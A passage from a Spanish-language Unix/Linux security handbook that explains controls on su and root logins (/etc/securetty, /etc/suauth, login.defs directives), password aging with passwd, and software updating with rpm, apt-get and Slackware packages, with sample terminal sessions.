<!--l. 330--><para>Como hemos dicho, la funci&#x00F3;n del anterior archivo es muy similar a la de la directiva &#x2018;CONSOLE&#x2019; en el &#xFB01;chero
/etc/default/login de Solaris; si no existe, el administrador puede conectar en remoto desde cualquier
lugar, mientras que si existe pero est&#x00E1; vac&#x02CA;&#x0131;o s&#x00F3;lo se pueden alcanzar privilegios de root a trav&#x00E9;s de la
ejecuci&#x00F3;n de &#x2018;su&#x2019;. En cualquier caso, el &#xFB01;chero no evita ni controla las conexiones remotas como
superusuario a trav&#x00E9;s de mecanismos como SSH o X Window, que poseen sus propios &#xFB01;cheros de
con&#xFB01;guraci&#x00F3;n.
<!--br/-->
<!--br/-->El contenido o la existencia de /etc/securetty tampoco evita de ninguna forma la ejecuci&#x00F3;n de &#x2018;su&#x2019;; para ello
existen otras directivas que controlan el acceso y el comportamiento de esta orden en el sistema. La primera de
ellas es SU<informalequation><graphic 
fileref="unixsec126x.gif"></graphic></informalequation>WHEEL<informalequation><graphic 
fileref="unixsec127x.gif"></graphic></informalequation>ONLY, que si posee un valor &#x2018;yes&#x2019; indica que s&#x00F3;lo los usuarios miembros del grupo
&#x2018;root&#x2019; <anchor 
   id="x1-147001f1"  ></anchor><footnote><para>   Realmente, del primer grupo con GID 0 en /etc/group, que corresponde al grupo &#x2018;root&#x2019; en la mayor&#x02CA;&#x0131;a de sistemas
Linux.</para></footnote>
van a ser capaces de cambiar su identidad mediante &#x2018;su&#x2019; a un usuario con privilegios de administrador
(UID 0); si este grupo no existe o est&#x00E1; vacio, nadie podr&#x00E1; ejecutar &#x2018;su&#x2019; para convertirse en superusuario.
<!--br/-->
<!--br/-->En el archivo /etc/suauth (completamente independiente de /etc/login.defs) se puede
realizar un control m&#x00E1;s minucioso de la ejecuci&#x00F3;n de &#x2018;su&#x2019;, no s&#x00F3;lo para acceder a cuentas con
privilegios de administraci&#x00F3;n, sino tambi&#x00E9;n para permitir o denegar cambios de identidad entre
dos usuarios cualesquiera del sistema. Se trata de un &#xFB01;chero en el que cada l&#x02CA;&#x0131;nea es de la
forma

  </para><literallayout role="verbatim">
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;to-id:from-id:ACCION
</literallayout>
<!--l. 358--><para>  donde ACCION puede ser DENY (se deniega el cambio de identidad), NOPASS (se permite el cambio sin
necesidad de ninguna clave) u OWNPASS (se solicita el password del usuario que ejecuta la orden en
lugar del correspondiente al usuario al que se quiere acceder); se puede consultar la p&#x00E1;gina del
manual suauth(5) para conocer la sintaxis exacta del archivo. Por ejemplo, si queremos que el
usuario &#x2018;toni&#x2019; no pueda ejecutar &#x2018;su&#x2019; para cambiar su identidad a &#x2018;root&#x2019;, pero que para
convertirse en &#x2018;prova&#x2019; s&#x00F3;lo tenga que teclear su propia contrase~na, tendremos un &#xFB01;chero similar al
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/etc/suauth
&#x00A0;root:toni:DENY
&#x00A0;prova:toni:OWNPASS
&#x00A0;luisa:~#
</literallayout>
<!--l. 376--><para>Cuando toni trate de hacer &#x2018;su&#x2019; a las cuentas anteriores, ver&#x00E1; algo similar a:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;id
&#x00A0;uid=1000(toni)&#x00A0;gid=100(users)&#x00A0;groups=100(users)
&#x00A0;luisa:~$&#x00A0;su
&#x00A0;Access&#x00A0;to&#x00A0;su&#x00A0;to&#x00A0;that&#x00A0;account&#x00A0;DENIED.
&#x00A0;You&#x00A0;are&#x00A0;not&#x00A0;authorized&#x00A0;to&#x00A0;su&#x00A0;root
&#x00A0;luisa:~$&#x00A0;luisa:~$&#x00A0;su&#x00A0;prova
&#x00A0;Please&#x00A0;enter&#x00A0;your&#x00A0;OWN&#x00A0;password&#x00A0;as&#x00A0;authentication.
&#x00A0;(Enter&#x00A0;your&#x00A0;own&#x00A0;password.)
&#x00A0;Password:
&#x00A0;luisa:/home/toni$&#x00A0;id
&#x00A0;uid=1006(prova)&#x00A0;gid=100(users)&#x00A0;groups=100(users)
&#x00A0;luisa:/home/toni$
</literallayout>
<!--l. 394--><para>Es importante destacar que el contenido del &#xFB01;chero /etc/suauth s&#x00F3;lo afecta a usuarios regulares, no al
root: no podemos de&#xFB01;nir reglas que eviten que el administrador de un sistema cambie su
identidad a cualquier usuario del mismo. Esto es algo evidente, ya que si no se permitiera al root
cambiar su identidad, este no tendr&#x02CA;&#x0131;a m&#x00E1;s que modi&#xFB01;car el &#xFB01;chero para eliminar la regla que se lo
impide.
<!--br/-->
<!--br/-->Volviendo a /etc/login.defs, el registro de las ejecuciones de &#x2018;su&#x2019; tambi&#x00E9;n se controla desde este &#xFB01;chero;
la directiva SULOG<informalequation><graphic 
fileref="unixsec129x.gif"></graphic></informalequation>FILE de&#xFB01;ne el archivo donde se registran las ejecuciones de esta orden,
tanto si son exitosas como si no. Adem&#x00E1;s, si el valor de SYSLOG<informalequation><graphic 
fileref="unixsec130x.gif"></graphic></informalequation>SU<informalequation><graphic 
fileref="unixsec131x.gif"></graphic></informalequation>ENAB es &#x2018;yes&#x2019; se guarda
un registro adicional a trav&#x00E9;s de syslogd en el archivo correspondiente; existe una directiva
an&#x00E1;loga a esta &#x00FA;ltima denominada SYSLOG<informalequation><graphic 
fileref="unixsec132x.gif"></graphic></informalequation>SG<informalequation><graphic 
fileref="unixsec133x.gif"></graphic></informalequation>ENAB, que registra tambi&#x00E9;n a trav&#x00E9;s de syslogd los
cambios de grupo que se producen en el sistema (por ejemplo, mediante la ejecuci&#x00F3;n de la orden
newgrp).
<!--br/-->
<!--br/-->Antes de dejar de lado los aspectos relacionados con &#x2018;su&#x2019; vamos a comentar una directiva muy
interesante: se trata de SU<informalequation><graphic 
fileref="unixsec134x.gif"></graphic></informalequation>NAME, que de&#xFB01;ne el nombre de programa que un &#x2018;ps&#x2019; muestra
cuando alguien ejecuta la orden &#x2018;su -&#x2019; (un cambio de identidad emulando un proceso de login
directo) en el sistema. Su valor por defecto es &#x2018;su&#x2019;, lo que indica que si alguien cambia su
identidad de la forma que acabamos de ver, un listado de procesos mostrar&#x00E1; algo similar a lo
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;su&#x00A0;-&#x00A0;prova
&#x00A0;Password:
&#x00A0;
&#x00A0;Famous,&#x00A0;adj.:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Conspicuously&#x00A0;miserable.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;--&#x00A0;Ambrose&#x00A0;Bierce
&#x00A0;
&#x00A0;luisa:~$&#x00A0;ps&#x00A0;xuw
&#x00A0;prova&#x00A0;&#x00A0;&#x00A0;&#x00A0;19990&#x00A0;&#x00A0;0.8&#x00A0;&#x00A0;0.3&#x00A0;&#x00A0;1708&#x00A0;&#x00A0;984&#x00A0;pts/8&#x00A0;&#x00A0;&#x00A0;&#x00A0;S&#x00A0;&#x00A0;&#x00A0;&#x00A0;07:04&#x00A0;&#x00A0;&#x00A0;0:00&#x00A0;-su
&#x00A0;prova&#x00A0;&#x00A0;&#x00A0;&#x00A0;20001&#x00A0;&#x00A0;0.0&#x00A0;&#x00A0;0.2&#x00A0;&#x00A0;2548&#x00A0;&#x00A0;908&#x00A0;pts/8&#x00A0;&#x00A0;&#x00A0;&#x00A0;R&#x00A0;&#x00A0;&#x00A0;&#x00A0;07:04&#x00A0;&#x00A0;&#x00A0;0:00&#x00A0;ps&#x00A0;xuw
&#x00A0;luisa:~$
</literallayout>
<!--l. 432--><para>Como vemos, en lugar del shell que el usuario est&#x00E9; utilizando, aparece el nombre de programa &#x2018;-su&#x2019; en la
&#x00FA;ltima columna del listado; si la directiva no estuviera de&#xFB01;nida s&#x02CA;&#x0131; que aparecer&#x02CA;&#x0131;a el nombre del shell
correspondiente. Puede resultar interesante rede&#xFB01;nir la directiva SU<informalequation><graphic 
fileref="unixsec135x.gif"></graphic></informalequation>NAME para asignarle un valor que
pueda resaltar m&#x00E1;s en el listado, de forma que el administrador pueda ver quien ha ejecutado la orden &#x2018;su
-&#x2019; de una forma m&#x00E1;s directa:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;grep&#x00A0;&#x02C6;SU&#x005F;NAME&#x00A0;/etc/login.defs
&#x00A0;SU&#x005F;NAME&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;***SU***
&#x00A0;luisa:~#&#x00A0;su&#x00A0;-&#x00A0;prova
&#x00A0;
&#x00A0;f&#x00A0;u&#x00A0;cn&#x00A0;rd&#x00A0;ths,&#x00A0;u&#x00A0;cn&#x00A0;gt&#x00A0;a&#x00A0;gd&#x00A0;jb&#x00A0;n&#x00A0;cmptr&#x00A0;prgrmmng.
&#x00A0;
&#x00A0;luisa:~$&#x00A0;ps&#x00A0;xuw
&#x00A0;USER&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;PID&#x00A0;%CPU&#x00A0;%MEM&#x00A0;&#x00A0;&#x00A0;VSZ&#x00A0;&#x00A0;RSS&#x00A0;TTY&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;STAT&#x00A0;START&#x00A0;&#x00A0;&#x00A0;TIME&#x00A0;COMMAND
&#x00A0;prova&#x00A0;&#x00A0;&#x00A0;&#x00A0;20083&#x00A0;&#x00A0;7.0&#x00A0;&#x00A0;0.3&#x00A0;&#x00A0;1712&#x00A0;&#x00A0;988&#x00A0;pts/8&#x00A0;&#x00A0;&#x00A0;&#x00A0;S&#x00A0;&#x00A0;&#x00A0;&#x00A0;07:11&#x00A0;&#x00A0;&#x00A0;0:00&#x00A0;-***SU***
&#x00A0;prova&#x00A0;&#x00A0;&#x00A0;&#x00A0;20094&#x00A0;&#x00A0;0.0&#x00A0;&#x00A0;0.2&#x00A0;&#x00A0;2548&#x00A0;&#x00A0;912&#x00A0;pts/8&#x00A0;&#x00A0;&#x00A0;&#x00A0;R&#x00A0;&#x00A0;&#x00A0;&#x00A0;07:11&#x00A0;&#x00A0;&#x00A0;0:00&#x00A0;ps&#x00A0;xuw
&#x00A0;luisa:~$
</literallayout>
<!--l. 454--><para>A la hora de de&#xFB01;nir nuevos usuarios en el sistema tambi&#x00E9;n entran en juego ciertas directivas del archivo
/etc/login.defs. Por ejemplo, el UID y GID m&#x00E1;ximo y m&#x02CA;&#x0131;nimo para los usuarios regulares viene
determinado por UID<informalequation><graphic 
fileref="unixsec136x.gif"></graphic></informalequation>MAX, GID<informalequation><graphic 
fileref="unixsec137x.gif"></graphic></informalequation>MAX, UID<informalequation><graphic 
fileref="unixsec138x.gif"></graphic></informalequation>MIN y GID<informalequation><graphic 
fileref="unixsec139x.gif"></graphic></informalequation>MIN. Tambi&#x00E9;n existen entradas para especi&#xFB01;car
ciertas caracter&#x02CA;&#x0131;sticas relacionadas con las claves de los nuevos usuarios del sistema: se trata de
PASS<informalequation><graphic 
fileref="unixsec140x.gif"></graphic></informalequation>MAX<informalequation><graphic 
fileref="unixsec141x.gif"></graphic></informalequation>DAYS, PASS<informalequation><graphic 
fileref="unixsec142x.gif"></graphic></informalequation>MIN<informalequation><graphic 
fileref="unixsec143x.gif"></graphic></informalequation>DAYS, PASS<informalequation><graphic 
fileref="unixsec144x.gif"></graphic></informalequation>MIN<informalequation><graphic 
fileref="unixsec145x.gif"></graphic></informalequation>LEN y PASS<informalequation><graphic 
fileref="unixsec146x.gif"></graphic></informalequation>WARN<informalequation><graphic 
fileref="unixsec147x.gif"></graphic></informalequation>AGE. Como sus nombres indican, estas
directivas marcan los n&#x00FA;meros m&#x00E1;ximo y m&#x02CA;&#x0131;nimo de d&#x02CA;&#x0131;as que una contrase~na puede ser usada, la longitud
m&#x02CA;&#x0131;nima que todo password ha de tener, y el n&#x00FA;mero de d&#x02CA;&#x0131;as de antelaci&#x00F3;n con que se avisar&#x00E1; a los usuarios
antes de que sus claves caduquen, respectivamente. Cada vez que se crea a un usuario nuevo en el sistema,
se toman estos valores por defecto, aunque despu&#x00E9;s es habitual particularizar para cada caso
concreto.
<!--br/-->
<!--br/-->Cuando un usuario ejecuta la orden passwd para cambiar su contrase~na en el sistema entra en juego la
directiva OBSCURE<informalequation><graphic 
fileref="unixsec148x.gif"></graphic></informalequation>CHECKS<informalequation><graphic 
fileref="unixsec149x.gif"></graphic></informalequation>ENAB (cuyo valor ha de ser &#x2018;yes&#x2019;) para impedir que se elijan claves d&#x00E9;biles
(por ejemplo, las formadas &#x00FA;nicamente por letras min&#x00FA;sculas); adicionalmente, si la orden est&#x00E1; enlazada a
cracklib (esto se realiza en tiempo de compilaci&#x00F3;n) y la directiva CRACKLIB<informalequation><graphic 
fileref="unixsec150x.gif"></graphic></informalequation>DICTPATH est&#x00E1; de&#xFB01;nida
y tiene como valor la ruta de un directorio, se buscan en el mismo &#xFB01;cheros de diccionario
contra los que comparar la nueva contrase~na, rechaz&#x00E1;ndola si se encuentra en alguno de ellos. En
cualquier caso, se permiten tantos intentos de cambio como indica PASS<informalequation><graphic 
fileref="unixsec151x.gif"></graphic></informalequation>CHANGE<informalequation><graphic 
fileref="unixsec152x.gif"></graphic></informalequation>TRIES, y
si se supera este n&#x00FA;mero se devuelve al usuario a su shell y la clave permanece inalterada; si
el usuario que trata de cambiar el password es el root &#x2013; tanto la propia clave como la de
cualquier usuario &#x2013; se le permite elegir cualquier contrase~na, sin importar su robustez, pero
se le advierte de que la clave elegida es d&#x00E9;bil si el valor de directiva PASS<informalequation><graphic 
fileref="unixsec153x.gif"></graphic></informalequation>ALWAYS<informalequation><graphic 
fileref="unixsec154x.gif"></graphic></informalequation>WARN es
&#x2018;yes&#x2019;.
<!--br/-->
<!--br/-->Al ejecutar passwd para modi&#xFB01;car valores del campo GECOS o para cambiar el shell de entrada al sistema
(o equivalentemente, al ejecutar chfn o chsh) se solicita al usuario su clave si el valor de la directiva
chfn<informalequation><graphic 
fileref="unixsec155x.gif"></graphic></informalequation>auth es &#x2018;yes&#x2019;. Adem&#x00E1;s, la entrada CHFN<informalequation><graphic 
fileref="unixsec156x.gif"></graphic></informalequation>RESTRICT de&#xFB01;ne los campos concretos que un
usuario puede modi&#xFB01;car: Full Name, Room Number, Work Phone y Home Phone (&#x2018;frwh&#x2019; si
permitimos que modi&#xFB01;que todos ellos); si la directiva no est&#x00E1; de&#xFB01;nida, no se permite ning&#x00FA;n tipo de
cambio.
<!--br/-->
<!--br/-->Relacionada tambi&#x00E9;n con las contrase~nas de los usuarios, la directiva PASS<informalequation><graphic 
fileref="unixsec157x.gif"></graphic></informalequation>MAX<informalequation><graphic 
fileref="unixsec158x.gif"></graphic></informalequation>LEN marca el
n&#x00FA;mero de caracteres signi&#xFB01;cativos en una clave (8 por defecto); no obstante, esta entrada es
ignorada si el valor de MD5<informalequation><graphic 
fileref="unixsec159x.gif"></graphic></informalequation>CRYPT<informalequation><graphic 
fileref="unixsec160x.gif"></graphic></informalequation>ENAB es &#x2018;yes&#x2019;, lo que indica que el sistema acepta passwords
basados en MD5, que proporcionan una longitud para las claves ilimitada y salts m&#x00E1;s largos que el
esquema cl&#x00E1;sico de Unix. La &#x00FA;nica raz&#x00F3;n para asignarle a esta &#x00FA;ltima directiva un valor &#x2018;no&#x2019; en
los Linux modernos es por razones de compatibilidad, ya que la seguridad que proporciona
este tipo de claves es mucho mayor que la proporcionada por los mecanismos habituales de
Unix.
<!--br/-->
<!--br/-->Dejando ya de lado el archivo /etc/login.defs, pero siguiendo con la gesti&#x00F3;n de las contrase~nas de

usuario, para consultar el estado de las mismas en un sistema Linux hemos de ejecutar la orden &#x2018;passwd
-S&#x2019; seguida del nombre del usuario correspondiente; por desgracia, en Linux no existe un par&#x00E1;metro &#x2018;-a&#x2019;
similar al de Solaris, que muestre informaci&#x00F3;n de todos los usuarios, por lo que hemos de hacer la consulta
uno a uno:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;for&#x00A0;i&#x00A0;in&#x00A0;&#x2018;awk&#x00A0;-F:&#x00A0;&#x2019;{print&#x00A0;$1}&#x2019;&#x00A0;/etc/passwd&#x2018;
&#x00A0;&#x003E;&#x00A0;do
&#x00A0;&#x003E;&#x00A0;passwd&#x00A0;-S&#x00A0;$i
&#x00A0;&#x003E;&#x00A0;done
&#x00A0;root&#x00A0;P&#x00A0;12/28/2000&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;bin&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;daemon&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;adm&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;lp&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;sync&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;shutdown&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;halt&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;mail&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;news&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;uucp&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;operator&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;games&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;ftp&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;gdm&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;nobody&#x00A0;L&#x00A0;10/28/1996&#x00A0;0&#x00A0;-1&#x00A0;-1&#x00A0;-1
&#x00A0;toni&#x00A0;P&#x00A0;12/29/2000&#x00A0;0&#x00A0;99999&#x00A0;7&#x00A0;-1
&#x00A0;prova&#x00A0;NP&#x00A0;10/23/2001&#x00A0;0&#x00A0;99999&#x00A0;7&#x00A0;-1
&#x00A0;luisa:~#
</literallayout>
<!--l. 536--><para>El segundo campo de cada l&#x02CA;&#x0131;nea del listado anterior proporciona el estado de la clave correspondiente: &#x2018;P&#x2019; si
el usuario tiene contrase~na, &#x2018;L&#x2019; si la cuenta est&#x00E1; bloqueada, y &#x2018;NP&#x2019; si el usuario no tiene clave
asignada; en este &#x00FA;ltimo caso es muy importante poner un password al usuario o bien bloquear su
acceso:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;passwd&#x00A0;-S&#x00A0;prova
&#x00A0;prova&#x00A0;NP&#x00A0;10/23/2001&#x00A0;0&#x00A0;99999&#x00A0;7&#x00A0;-1
&#x00A0;luisa:~#&#x00A0;passwd&#x00A0;-l&#x00A0;prova
&#x00A0;Password&#x00A0;changed.
&#x00A0;luisa:~#&#x00A0;passwd&#x00A0;-S&#x00A0;prova
&#x00A0;prova&#x00A0;L&#x00A0;10/23/2001&#x00A0;0&#x00A0;99999&#x00A0;7&#x00A0;-1
&#x00A0;luisa:~#
</literallayout>
<!--l. 552--><para>El resto de campos del listado hacen referencia propiedades de envejecimiento de las claves: cuando se cambi&#x00F3;
la contrase~na de cada usuario por &#x00FA;ltima vez, cuales son sus periodos de validez m&#x00E1;ximo y m&#x02CA;&#x0131;nimo, el
periodo de aviso y el periodo de inactividad antes de bloquear el acceso de forma autom&#x00E1;tica; tambi&#x00E9;n
mediante passwd (o equivalentemente mediante chage) podemos &#x2013; como root &#x2013; modi&#xFB01;car esta informaci&#x00F3;n
para cada uno de nuestros usuarios. Por ejemplo, si queremos que la clave del usuario &#x2018;prova&#x2019; tenga un
periodo de validez m&#x00E1;ximo de un mes y m&#x02CA;&#x0131;nimo de 10 d&#x02CA;&#x0131;as, que se avise al usuario de que su clave va a
caducar con una antelaci&#x00F3;n de una semana, y que si una vez la clave ha caducado el usuario
no entra al sistema en cinco d&#x02CA;&#x0131;as se bloquee su cuenta podemos conseguirlo con la siguiente
orden:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;passwd&#x00A0;-S&#x00A0;prova
&#x00A0;prova&#x00A0;L&#x00A0;10/23/2001&#x00A0;0&#x00A0;99999&#x00A0;7&#x00A0;-1
&#x00A0;luisa:~#&#x00A0;passwd&#x00A0;-x&#x00A0;30&#x00A0;-n&#x00A0;10&#x00A0;-w&#x00A0;7&#x00A0;-i&#x00A0;5&#x00A0;prova
&#x00A0;Password&#x00A0;changed.
&#x00A0;luisa:~#&#x00A0;passwd&#x00A0;-S&#x00A0;prova
&#x00A0;prova&#x00A0;L&#x00A0;10/23/2001&#x00A0;10&#x00A0;30&#x00A0;7&#x00A0;5
&#x00A0;luisa:~#
</literallayout>
<!--l. 575--><para>Como en este caso la cuenta est&#x00E1; bloqueada, los cambios tendr&#x00E1;n efecto cuando esta se desbloquee (o
directamente se le asigne una nueva clave) y comience a ser utilizada; a diferencia de otros sistemas Unix,
el desbloqueo de un acceso en Linux guarda una especie de estado: conserva la contrase~na que el usuario
ten&#x02CA;&#x0131;a antes de que su cuenta fuera bloqueada.
  </para></section><!--end section--><!--l. 581--><section 
role="section"><title><abbrev role="title-mark">10.4</abbrev><anchor 
   id="x1-14800010.4"  ></anchor>El sistema de parcheado</title>
<!--l. 582--><para>  A la hora de hablar de actualizaciones en Linux debemos distinguir entre la actualizaci&#x00F3;n
del n&#x00FA;cleo del operativo y la de las diferentes aplicaciones del sistema. Esta &#x00FA;ltima no es en
ning&#x00FA;n momento algo tan est&#x00E1;ndar como lo pueda ser en Unices comerciales como Solaris o
AIX debido a que no hay un &#x00FA;nico modelo de Linux en el mercado, sino que existen diferentes
clones de este operativo, y a pesar de que todos son &#x2018;Linux&#x2019; en cada uno de ellos se trabaja de
forma diferente. Por contra, si lo que se va a actualizar es el n&#x00FA;cleo de Linux en cualquiera
de ellos se procede de la misma forma, ya que el kernel es com&#x00FA;n a todas las distribuciones.
Vamos a hablar primero brevemente de los diferentes m&#x00E9;todos de actualizaci&#x00F3;n de aplicaciones en
funci&#x00F3;n del Linux utilizado y despu&#x00E9;s comentaremos aspectos de actualizaci&#x00F3;n y parcheado del
n&#x00FA;cleo.
<!--br/-->
<!--br/-->En Red Hat, y en todos los Linux basados en esta distribuci&#x00F3;n (Mandrake, Caldera&#x2026;) el software se suele
descargar precompilado desde Internet en un formato especial denominado RPM (Red Hat
Package Manager), que permite al administrador de un sistema instalar y desinstalar programas,
as&#x02CA;&#x0131; como veri&#xFB01;car versiones del software instalado en la m&#x00E1;quina; podemos encontrar una extensa
descripci&#x00F3;n de este formato en <citation>[?]</citation>, aunque la idea m&#x00E1;s elemental acerca del mismo es que se
trata de un sistema de gesti&#x00F3;n (instalaci&#x00F3;n, actualizaci&#x00F3;n, borrado&#x2026;) de software capaz de hacer
comprobaciones de dependencia entre paquetes, ejecutar programas de pre y postinstalaci&#x00F3;n y
detectar y solventar cierto tipo de con&#xFB02;ictos entre diferentes paquetes o diferentes versiones del
mismo.
<!--br/-->
<!--br/-->Actualizar versiones de software mediante rpm es una tarea sencilla: normalmente el administrador no
tiene m&#x00E1;s que ejecutar &#x2018;rpm -U&#x2019;, orden que se encargar&#x00E1; de instalar la nueva versi&#x00F3;n y eliminar la antigua (si
existe); es equivalente a ejecutar primero una instalaci&#x00F3;n (&#x2018;rpm -i&#x2019;) del paquete actualizado
y despu&#x00E9;s un borrado (&#x2018;rpm -e&#x2019;) de la versi&#x00F3;n anteriormente instalada en la m&#x00E1;quina. Lo m&#x00E1;s
habitual es ver en primer lugar la versi&#x00F3;n concreta de un paquete soft instalado en la m&#x00E1;quina,
mediante &#x2018;rpm -q&#x2019; (&#x2018;rpm -qa&#x2019; nos mostrar&#x00E1; un listado de todos y cada uno de los paquetes
instalados):

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;rpm&#x00A0;-q&#x00A0;libpcap
&#x00A0;libpcap-0.4-10
&#x00A0;rosita:~#
</literallayout>
<!--l. 623--><para>Tras esto podemos conseguir una versi&#x00F3;n actualizada (el paquete en formato RPM del software que nos
interese) e instalarla mediante las &#x00F3;rdenes vistas anteriormente:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;ls&#x00A0;-l&#x00A0;libpcap-0.4-19.i386.rpm
&#x00A0;-rw-r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;56554&#x00A0;Feb&#x00A0;18&#x00A0;03:54&#x00A0;libpcap-0.4-19.i386.rpm
&#x00A0;rosita:~#&#x00A0;rpm&#x00A0;-U&#x00A0;libpcap-0.4-19.i386.rpm
&#x00A0;rosita:~#&#x00A0;rpm&#x00A0;-q&#x00A0;libpcap
&#x00A0;libpcap-0.4-19
&#x00A0;rosita:~#
</literallayout>
<!--l. 636--><para>Por su parte, en Debian y derivados, la actualizaci&#x00F3;n de software se puede llevar a cabo mediante &#x2018;dpkg&#x2019;, que
permite instalar, con&#xFB01;gurar y eliminar paquetes; no obstante, su uso &#x2013; al menos de forma directa &#x2013; hoy en
d&#x02CA;&#x0131;a es poco habitual debido a la existencia de otra herramienta denominada APT (Advanced Package Tool),
posiblemente el mecanismo de instalaci&#x00F3;n y actualizaci&#x00F3;n de software m&#x00E1;s c&#x00F3;modo de cuantos existen en Linux.
La principal interfaz entre este sistema y el usuario es &#x2018;apt-get&#x2019;, herramienta de l&#x02CA;&#x0131;nea de
&#x00F3;rdenes cuyo funcionamiento se basa especialmente en el &#xFB01;chero /etc/apt/sources.list, que
como su nombre indica es un registro de las fuentes desde las que se pueden obtener paquetes
actualizados.
<!--br/-->
<!--br/-->Los paquetes de software en Debian suelen tener un nombre &#xFB01;nalizado en &#x2018;.deb&#x2019;, que realmente es un
&#x2018;.ar&#x2019; con algunas modi&#xFB01;caciones; para obtener un listado actualizado de los paquetes disponibles en las
diferentes ubicaciones indicadas en /etc/apt/sources.list no tenemos m&#x00E1;s que ejecutar la
orden &#x2018;apt-get update&#x2019; (algo recomendable cada vez que se modi&#xFB01;que el &#xFB01;chero de fuentes),
que conectar&#x00E1; a cada una de dichas ubicaciones y descargar&#x00E1; la lista de paquetes actualizados;
esta orden no instala esos paquetes, por lo que a continuaci&#x00F3;n deberemos ejecutar &#x2018;apt-get
install&#x2019; o, directamente &#x2018;apt-get upgrade&#x2019; para actualizar las versiones del software ya
instalado:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;apt-get&#x00A0;upgrade
&#x00A0;Reading&#x00A0;Package&#x00A0;Lists...&#x00A0;Done
&#x00A0;Building&#x00A0;Dependency&#x00A0;Tree...&#x00A0;Done
&#x00A0;0&#x00A0;packages&#x00A0;upgraded,&#x00A0;0&#x00A0;newly&#x00A0;installed,&#x00A0;0&#x00A0;to&#x00A0;remove&#x00A0;and&#x00A0;0&#x00A0;not&#x00A0;upgraded.
&#x00A0;rosita:~#
</literallayout>
<!--l. 666--><para>Tanto Red Hat como Debian proporcionan mecanismos para veri&#xFB01;car &#x2013; hasta cierto punto &#x2013;
la integridad de cada paquete instalado; realmente, m&#x00E1;s que la integridad, podr&#x02CA;&#x0131;amos hablar
de las modi&#xFB01;caciones sufridas por archivos instalados a partir de un paquete con respecto a
los originales (qu&#x00E9; &#xFB01;cheros han sido modi&#xFB01;cados desde la instalaci&#x00F3;n), ya que no se trata de
comprobaciones de integridad que nos permitan decir si un paquete ha sido troyanizado o
no, sino simples veri&#xFB01;caciones de presencia de &#xFB01;cheros modi&#xFB01;cados. Como casi siempre, para
comprobar realmente la autenticidad del software debemos recurrir a funciones resumen tipo
MD5.
<!--br/-->
<!--br/-->El Linux m&#x00E1;s arcaico (pero no por ello el peor, ni mucho menos) a la hora de actualizar software es
Slackware; en esta distribuci&#x00F3;n de Linux el formato de paquete es sin duda el m&#x00E1;s est&#x00E1;ndar de todos: el
software se distribuye en &#xFB01;cheros .tgz, que no son m&#x00E1;s que archivos .tar.gz compatibles con cualquier
Unix, con unas peque~nas modi&#xFB01;caciones para poderlos instalar mediante installpkg, un
sencillo shellscript. En cualquier caso, ni siquiera suele ser necesaria esta utilidad para instalar
&#xFB01;cheros .tgz: es su&#xFB01;ciente con desempaquetarlos y descomprimirlos desde el directorio ra&#x02CA;&#x0131;z de la
m&#x00E1;quina.
